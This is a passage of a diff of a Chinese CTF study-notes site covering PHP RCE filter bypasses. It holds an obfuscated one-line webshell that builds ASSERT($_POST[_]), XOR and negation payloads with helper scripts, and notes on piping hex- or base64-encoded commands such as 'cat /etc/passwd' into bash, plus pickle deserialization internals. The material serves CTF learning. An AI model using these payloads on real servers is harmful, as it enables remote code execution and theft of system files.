-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">=</span>$_;
-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>; <span style="color:#75715e">// P
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$____<span style="color:#f92672">.=</span>$__;
-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">=</span>$_;
-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>; <span style="color:#75715e">// O
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$____<span style="color:#f92672">.=</span>$__;
-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">=</span>$_;
-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>; <span style="color:#75715e">// S
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$____<span style="color:#f92672">.=</span>$__;
-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">=</span>$_;
-</span></span><span style="display:flex;"><span>$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>;$__<span style="color:#f92672">++</span>; <span style="color:#75715e">// T
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$____<span style="color:#f92672">.=</span>$__;
-</span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span>$_<span style="color:#f92672">=</span>$$____;
-</span></span><span style="display:flex;"><span>$___($_[<span style="color:#a6e22e">_</span>]); <span style="color:#75715e">// ASSERT($_POST[_]);
-</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="f80c2ac" class="language-php ">
+  <code>&lt;?php
+$_=[];
+$_=@&#34;$_&#34;; // $_=&#39;Array&#39;;
+$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];
+$___=$_; // A
+$__=$_;
+$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;
+$___.=$__; // S
+$___.=$__; // S
+$__=$_;
+$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // E 
+$___.=$__;
+$__=$_;
+$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // R
+$___.=$__;
+$__=$_;
+$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // T
+$___.=$__;
+ 
+$____=&#39;_&#39;;
+$__=$_;
+$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // P
+$____.=$__;
+$__=$_;
+$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // O
+$____.=$__;
+$__=$_;
+$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // S
+$____.=$__;
+$__=$_;
+$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;;$__&#43;&#43;; // T
+$____.=$__;
+ 
+$_=$$____;
+$___($_[_]); // ASSERT($_POST[_]);</code>
+  </pre>
+  </div>
 <p>异或
 <a href="https://blog.csdn.net/qq_61778128/article/details/127063407" rel="external" target="_blank">参考文章<svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M14 5c-.552 0-1-.448-1-1s.448-1 1-1h6c.552 0 1 .448 1 1v6c0 .552-.448 1-1 1s-1-.448-1-1v-3.586l-7.293 7.293c-.391.39-1.024.39-1.414 0-.391-.391-.391-1.024 0-1.414l7.293-7.293h-3.586zm-9 2c-.552 0-1 .448-1 1v11c0 .552.448 1 1 1h11c.552 0 1-.448 1-1v-4.563c0-.552.448-1 1-1s1 .448 1 1v4.563c0 1.657-1.343 3-3 3h-11c-1.657 0-3-1.343-3-3v-11c0-1.657 1.343-3 3-3h4.563c.552 0 1 .448 1 1s-.448 1-1 1h-4.563z"/></svg></a></p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># 对字符串进行异或操作时，php解析时会将异或结果自动转换为字符串，以其给$_赋值，再通过拼接获取payload</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">然后将需要的命令拼接出来。
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">列如：phpinfo()
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(&#39;GGGGGGG&#39;^&#39;7/7.)!(&#39;)();
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 其中&#39;G&#39;^&#39;7&#39;=p，&#39;G&#39;^&#39;/&#39;=h…………依次类推拼出你想得到的命令。
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">在有时候，字母和输入全被过滤掉的时候，可以用不可打印字符来进行命令执行。可以稍微改一下上边的脚本，将字符url编码之后再输出，这时候就能绕过去了。
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">128</span>):
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">128</span>):
-</span></span><span style="display:flex;"><span>            result<span style="color:#f92672">=</span>i<span style="color:#f92672">^</span>j
-</span></span><span style="display:flex;"><span>            print(chr(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;  ^  &#39;</span><span style="color:#f92672">+</span>chr(j)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39; == &gt;  &#39;</span><span style="color:#f92672">+</span>chr(result)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34; ASCII:&#34;</span><span style="color:#f92672">+</span>str(result))
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
-</span></span><span style="display:flex;"><span>    xor()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 或者这个脚本</span>
-</span></span><span style="display:flex;"><span>valid <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1234567890!@$%^*()</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">[];</span><span style="color:#ae81ff">\&#39;\&#34;</span><span style="color:#e6db74">,.&lt;&gt;/?-=_`~ &#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
-</span></span><span style="display:flex;"><span>answer <span style="color:#f92672">=</span> str(input(<span style="color:#e6db74">&#34;请输入进行异或构造的字符串：&#34;</span>))
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">​</span>
-</span></span><span style="display:flex;"><span>tmp1, tmp2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> answer:
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> valid:
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> valid:
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (ord(i) <span style="color:#f92672">^</span> ord(j) <span style="color:#f92672">==</span> ord(c)):
-</span></span><span style="display:flex;"><span>        tmp1 <span style="color:#f92672">+=</span> i
-</span></span><span style="display:flex;"><span>        tmp2 <span style="color:#f92672">+=</span> j
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">continue</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;tmp1为:&#34;</span>,tmp1)
-</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;tmp2为:&#34;</span>,tmp2)</span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="41efd96" class="language-python ">
+  <code># 对字符串进行异或操作时，php解析时会将异或结果自动转换为字符串，以其给$_赋值，再通过拼接获取payload
+&#34;&#34;&#34;
+然后将需要的命令拼接出来。
+列如：phpinfo()
+(&#39;GGGGGGG&#39;^&#39;7/7.)!(&#39;)();
+ 其中&#39;G&#39;^&#39;7&#39;=p，&#39;G&#39;^&#39;/&#39;=h…………依次类推拼出你想得到的命令。
+在有时候，字母和输入全被过滤掉的时候，可以用不可打印字符来进行命令执行。可以稍微改一下上边的脚本，将字符url编码之后再输出，这时候就能绕过去了。
+&#34;&#34;&#34;
+def xor():
+    for i in range(0,128):
+        for j in range(0,128):
+            result=i^j
+            print(chr(i)&#43;&#39;  ^  &#39;&#43;chr(j)&#43;&#39; == &gt;  &#39;&#43;chr(result)&#43;&#34; ASCII:&#34;&#43;str(result))
+if __name__ == &#34;__main__&#34;:
+    xor()
+
+
+# 或者这个脚本
+valid = &#34;1234567890!@$%^*(){}[];\&#39;\&#34;,.&lt;&gt;/?-=_`~ &#34;
+​
+answer = str(input(&#34;请输入进行异或构造的字符串：&#34;))
+​
+tmp1, tmp2 = &#39;&#39;, &#39;&#39;
+for c in answer:
+  for i in valid:
+    for j in valid:
+      if (ord(i) ^ ord(j) == ord(c)):
+        tmp1 &#43;= i
+        tmp2 &#43;= j
+        break
+    else:
+      continue
+    break
+print(&#34;tmp1为:&#34;,tmp1)
+print(&#34;tmp2为:&#34;,tmp2)</code>
+  </pre>
+  </div>
 <p>取反
 <a href="https://blog.csdn.net/qq_61778128/article/details/127063407" rel="external" target="_blank">参考文章<svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor" d="M14 5c-.552 0-1-.448-1-1s.448-1 1-1h6c.552 0 1 .448 1 1v6c0 .552-.448 1-1 1s-1-.448-1-1v-3.586l-7.293 7.293c-.391.39-1.024.39-1.414 0-.391-.391-.391-1.024 0-1.414l7.293-7.293h-3.586zm-9 2c-.552 0-1 .448-1 1v11c0 .552.448 1 1 1h11c.552 0 1-.448 1-1v-4.563c0-.552.448-1 1-1s1 .448 1 1v4.563c0 1.657-1.343 3-3 3h-11c-1.657 0-3-1.343-3-3v-11c0-1.657 1.343-3 3-3h4.563c.552 0 1 .448 1 1s-.448 1-1 1h-4.563z"/></svg></a></p>
 
 
-    
-    <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">urlencode</span>(<span style="color:#f92672">~</span><span style="color:#e6db74">&#39;phpinfo&#39;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># system();
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>(<span style="color:#f92672">~%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">C</span><span style="color:#f92672">%</span><span style="color:#ae81ff">86</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">C</span><span style="color:#f92672">%</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">92</span>)();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># /flag
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?=</span><span style="color:#66d9ef">require</span><span style="color:#f92672">~%</span><span style="color:#a6e22e">d0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">99</span><span style="color:#f92672">%</span><span style="color:#ae81ff">93</span><span style="color:#f92672">%</span><span style="color:#ae81ff">9</span><span style="color:#a6e22e">e</span><span style="color:#f92672">%</span><span style="color:#ae81ff">98</span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div>
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="e9980e8" class="language-php ">
+  <code>echo urlencode(~&#39;phpinfo&#39;);
+# system();
+(~%8C%86%8C%8B%9A%92)();
+
+# /flag
+&lt;?=require~%d0%99%93%9e%98?&gt;</code>
+  </pre>
+  </div>
 
     </div>
 
@@ -1149,7 +1421,7 @@ $IFS
                 id:  8 ,
                 href: "\/docs\/ctf\/%E7%9F%A5%E8%AF%86%E7%82%B9\/rce\/",
                 title: "RCE",
-                description: "PHP link基本函数 link1.eval()可以将传入的字符串当作php代码执行 解题时常用的指令：phpinfo()查看是否有回显 system()指令用于执行系统命令，如\nsystem('ls'); system('cat'); //记得在每一条指令后面加； 其它函数：\n//具体函数内容查看手册 exec shell_exec passthru popen proc_popen Assert(mixed $assertion,string $description = ?) //会检查assertion，如果是字符串，会被当成php代码执行 Call_user_func(callable $callback …..) //callback是被调用的回调函数 Call_user_func_array(callable $callback) //同上 Creat_function(args,code) //如 \u003c?php error_reporting(0); $new_func = create_function('$a,$b','return \"$a \".\"$b\";');//new_func为函数名，$a $b为参数，后面代码 echo $new_func('hello','hack').\"\\n\"; ?\u003e 连接两个命令\n| || \u0026 \u0026\u0026 ; 绕过 link 简单绕过关键词过滤a=eval($_GET['A'])\u0026A=system 内联执行：cat `ls`，echo $(ls) 使用’‘包裹一组指令 ('ls /') 绕过内置过滤函数\n$url=escapeshellarg($url); $url=escapeshellcmd($url); /* 连用会产生单引号逃逸，传入1' xxx 返回'1'\\\\''XXX\\' \\被转义，还多出来一个' */ 绕过文件名限制\ncat /f* # 过滤f l a g时，使用glob通配符绕过 # file:///D:/ctf/doc/Linux shell通配符_ glob.htm more /[e-h][k-m][0-b][e-h] # “ _[A-Fa-f0-9]_ ”相当于 \" _[ABCDEFabcdef0123456789]_ \".) # “ _[-%]_ ”代表“ _[!”#$%]_ ”而“ _[az]_ ”代表“任何 小写字母” 编码绕过\n",
+                description: "PHP link基本函数 link1.eval()可以将传入的字符串当作php代码执行 解题时常用的指令：phpinfo()查看是否有回显 system()指令用于执行系统命令，如\nsystem('ls'); system('cat'); //记得在每一条指令后面加； 其它函数：\n//具体函数内容查看手册 exec shell_exec passthru popen proc_popen Assert(mixed $assertion,string $description = ?) //会检查assertion，如果是字符串，会被当成php代码执行 Call_user_func(callable $callback …..) //callback是被调用的回调函数 Call_user_func_array(callable $callback) //同上 Creat_function(args,code) //如 \u003c?php error_reporting(0); $new_func = create_function('$a,$b','return \"$a \".\"$b\";');//new_func为函数名，$a $b为参数，后面代码 echo $new_func('hello','hack').\"\\n\"; ?\u003e 连接两个命令\n| || \u0026 \u0026\u0026 ; 绕过 link 简单绕过关键词过滤a=eval($_GET['A'])\u0026A=system 内联执行：cat `ls`，echo $(ls) 使用’‘包裹一组指令 ('ls /') 绕过内置过滤函数\n$url=escapeshellarg($url); $url=escapeshellcmd($url); /* 连用会产生单引号逃逸，传入1' xxx 返回'1'\\\\''XXX\\' \\被转义，还多出来一个' */ 绕过文件名限制\n",
                 content: "PHP link基本函数 link1.eval()可以将传入的字符串当作php代码执行 解题时常用的指令：phpinfo()查看是否有回显 system()指令用于执行系统命令，如\nsystem('ls'); system('cat'); //记得在每一条指令后面加； 其它函数：\n//具体函数内容查看手册 exec shell_exec passthru popen proc_popen Assert(mixed $assertion,string $description = ?) //会检查assertion，如果是字符串，会被当成php代码执行 Call_user_func(callable $callback …..) //callback是被调用的回调函数 Call_user_func_array(callable $callback) //同上 Creat_function(args,code) //如 \u003c?php error_reporting(0); $new_func = create_function('$a,$b','return \"$a \".\"$b\";');//new_func为函数名，$a $b为参数，后面代码 echo $new_func('hello','hack').\"\\n\"; ?\u003e 连接两个命令\n| || \u0026 \u0026\u0026 ; 绕过 link 简单绕过关键词过滤a=eval($_GET['A'])\u0026A=system 内联执行：cat `ls`，echo $(ls) 使用’‘包裹一组指令 ('ls /') 绕过内置过滤函数\n$url=escapeshellarg($url); $url=escapeshellcmd($url); /* 连用会产生单引号逃逸，传入1' xxx 返回'1'\\\\''XXX\\' \\被转义，还多出来一个' */ 绕过文件名限制\ncat /f* # 过滤f l a g时，使用glob通配符绕过 # file:///D:/ctf/doc/Linux shell通配符_ glob.htm more /[e-h][k-m][0-b][e-h] # “ _[A-Fa-f0-9]_ ”相当于 \" _[ABCDEFabcdef0123456789]_ \".) # “ _[-%]_ ”代表“ _[!”#$%]_ ”而“ _[az]_ ”代表“任何 小写字母” 编码绕过\n# 回显只有数字情况下，使用od进行输出： od -t d1 /flag # 这是一个命令行指令，用于以十进制形式显示 /flag 文件的内容，具体来说-t 参数用于指定展示的数据格式，d1 表示每个数值使用一个字节来显示，即按字节读取。 # 16进制，先bin2hex php -r eval(hex2bin(substr(_十六进制,1))) # 63617420666c61672e706870是cat flag.php的16进制 # cat /etc/passwd echo \"636174202F6574632F706173737764\" | xxd -r -p|bash # php 十六进制绕过 system(); \"\\x73\\x79\\x73\\x74\\x65\\x6d\"(); # 或者base64/32 echo \"base64编码\"|base64 -d|bash echo \"base64编码\"|base64 -d|sh echo 'Y2F0wqAK' | base64 -d /etc/passwd # cat /etc/passwd # 八进制 # ls $(printf \"\\154\\163\") 绕过空格\n%09（url传递）(tab) %20(space) ${IFS} $IFS$9 $IFS$1 \u003c\u003e（cat\u003c\u003e/flag） \u003c（cat"
             }
         );
@@ -1176,7 +1448,7 @@ $IFS
                 id:  11 ,
                 href: "\/docs\/ctf\/%E7%9F%A5%E8%AF%86%E7%82%B9\/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/",
                 title: "Pickle反序列化",
-                description: "可被序列化的目标： link None，True，False 整数，浮点数，复数 str，byte，bytearray 只包含可序列化对象的集合：tuple，list，set，dict 定义在模块最外层的函数，指使用def定义的函数，而不是lambda 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或者__getstate__()函数返回值可以被序列化的类 反序列化过程 linkpickle反序列化依靠PVM（Pickle Virtual Machine）进行。 其涉及三个部分：\n解析引擎 存放到栈 存储到内存 解析引擎：从流中读取opcode和参数，对其进行解释处理，直到遇到.停止，最后留在栈顶的值就是反序列化对象。 栈：由list实现，存储临时对象，参数以及对象 内存memo：由dict实现，为PVM的生命周期提供存储，即将反序列化完成的数据以key-value的形式存在memo中以供后面使用。 opcode linkpickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：\nimport pickle a={'1': 1, '2': 2} print(f'# 原变量：{a!r}') for i in range(4): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) # 原变量：{'1': 1, '2': 2} pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.' pickle版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本4 b'\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.' pickle3版本opcode示例： 原数据：abcd b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.'\n\\x80：协议头声明，读取此字符串后，会再读取一个字节 \\x03：协议版本 \\x04\\x00\\x00\\x00：数据长度：4 abcd数据 q存储在栈顶的字符串长度 \\x00栈顶位置，一个字节 .数据截止 b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(Vname\\nVrxz\\nVgrade\\nVG2\\nub.'\nc：GLOBAL操作符，连续读取两个字符串，分别作为module和name，以\\n分割，然后把module.name压入栈。注意此操作符使用find_class函数，作用为从x模块找到y，且只能在y在x顶层情况下找到y )：将一个空的元组tuple压入当前栈 \\x81：从栈中先弹出一个元素，记为args；再弹出一个元素记为cls，接下来执行cls.__new__(cls,*arg)，然后把得到的内容压入栈。即弹出参数和类，利用这个参数实例化类。 }：将一个空dist压入栈 (：MARK操作符，load_mark；将当前栈作为一个list，压进前序栈；然后把当前栈清空。 V：读入字符串，以\\n结尾，压入栈。 u：调用pop_mark，记录当前栈为list，在load_mark结束后返回；弹出前序栈栈顶，用list覆盖前序栈。执行之后结果：arr=['name','rxz','grade','G2']，当前栈为__main__.Sudent类和空dict；拿到当前栈的末尾元素，必须为dict，两个一组读取arr里的元素，前者为key后者为value存入dict。得到{'name': 'rxz', 'grade': 'G2'}，现在栈里面有一个实例一个字典 b：将当前栈栈顶存进state，弹出；当前栈栈顶为inst，弹出；用state的值更新实例inst；压入栈。此处使用的方法为：如果inst有__setstate__方法，直接交给方法，否则把state中的字典合并到inst.__dict__ .：结束；最后得到的结果是__main__.Sudent，其name值为rxz，grade值是G2 t：寻找栈中的上一个mark，并组合之间的数据为元组 S：实例化一个字符串对象 pickle0版本部分opcode：\n",
+                description: "可被序列化的目标： link None，True，False 整数，浮点数，复数 str，byte，bytearray 只包含可序列化对象的集合：tuple，list，set，dict 定义在模块最外层的函数，指使用def定义的函数，而不是lambda 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或者__getstate__()函数返回值可以被序列化的类 反序列化过程 linkpickle反序列化依靠PVM（Pickle Virtual Machine）进行。 其涉及三个部分：\n解析引擎 存放到栈 存储到内存 解析引擎：从流中读取opcode和参数，对其进行解释处理，直到遇到.停止，最后留在栈顶的值就是反序列化对象。 栈：由list实现，存储临时对象，参数以及对象 内存memo：由dict实现，为PVM的生命周期提供存储，即将反序列化完成的数据以key-value的形式存在memo中以供后面使用。 opcode linkpickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：\nimport pickle a={'1': 1, '2': 2} print(f'# 原变量：{a!r}') for i in range(4): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) # 原变量：{'1': 1, '2': 2} pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.' pickle版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本4 b'\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.' pickle3版本opcode示例： 原数据：abcd b'\\x80\\x03X\\x04\\x00\\x00\\x00abcdq\\x00.'\n\\x80：协议头声明，读取此字符串后，会再读取一个字节 \\x03：协议版本 \\x04\\x00\\x00\\x00：数据长度：4 abcd数据 q存储在栈顶的字符串长度 \\x00栈顶位置，一个字节 .数据截止 b'\\x80\\x03c__main__\\nStudent\\n)\\x81}(Vname\\nVrxz\\nVgrade\\nVG2\\nub.'\n",
                 content: "可被序列化的目标： link None，True，False 整数，浮点数，复数 str，byte，bytearray 只包含可序列化对象的集合：tuple，list，set，dict 定义在模块最外层的函数，指使用def定义的函数，而不是lambda 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或者__getstate__()函数返回值可以被序列化的类 反序列化过程 linkpickle反序列化依靠PVM（Pickle Virtual Machine）进行。 其涉及三个部分：\n解析引擎 存放到栈 存储到内存 解析引擎：从流中读取opcode和参数，对其进行解释处理，直到遇到.停止，最后留在栈顶的值就是反序列化对象。 栈：由list实现，存储临时对象，参数以及对象 内存memo：由dict实现，为PVM的生命周期提供存储，即将反序列化完成的数据以key-value的形式存在memo中以供后面使用。 opcode linkpickle在由不同的实现版本，在py2和3得到的opcode不相同，但各个版本可以向下兼容。目前有六个版本：\nimport pickle a={'1': 1, '2': 2} print(f'# 原变量：{a!r}') for i in range(4): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) # 原变量：{'1': 1, '2': 2} pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.' pickle版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' pickle版本4 